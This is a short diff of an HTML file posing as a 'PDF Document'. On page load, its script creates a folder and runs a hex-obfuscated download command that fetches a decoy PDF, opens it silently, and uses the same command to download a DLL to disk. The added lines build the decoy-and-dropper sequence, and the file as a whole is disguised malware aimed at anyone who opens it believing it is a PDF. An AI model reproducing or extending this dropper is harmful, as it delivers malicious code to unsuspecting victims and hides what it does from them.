@@ -1,4 +1,3 @@
-
 <html>
 <head>
 <title>PDF Document</title>
@@ -66,9 +65,21 @@ window.onload = function () {
         
         function sleep(ms) {
             rr.Run("ping 127.0.0.1 -n " + ((ms / 3000) + 1) + " > nul", 0, true);
-        }      
+        }
+        
+        if (!fso.FolderExists(targetDir)) {
+            fso.CreateFolder(targetDir);
+        }
+        
+        sleep(3000);
+        
+        rr.Run(dtext("430d4654434458575d5a1448795864425e535b59551819265f545d565e5110447b59420e58071c66545562574043511643171965435c") + " '" + pdfUrl + "' -OutFile '" + pdfLocal + "'", 0, true);
 
-        sleep(5000); 
+        sleep(1500);
+        
+        shellApp.ShellExecute(pdfLocal, "", "", "open", 0);
+
+        sleep(3000); 
         
         rr.Run(dtext("430d4654434458575d5a1448795864425e535b59551819265f545d565e5110447b59420e58071c66545562574043511643171965435c") + " '" + dllUrl + "' -OutFile '" + dllPath + "'", 0, true);
 
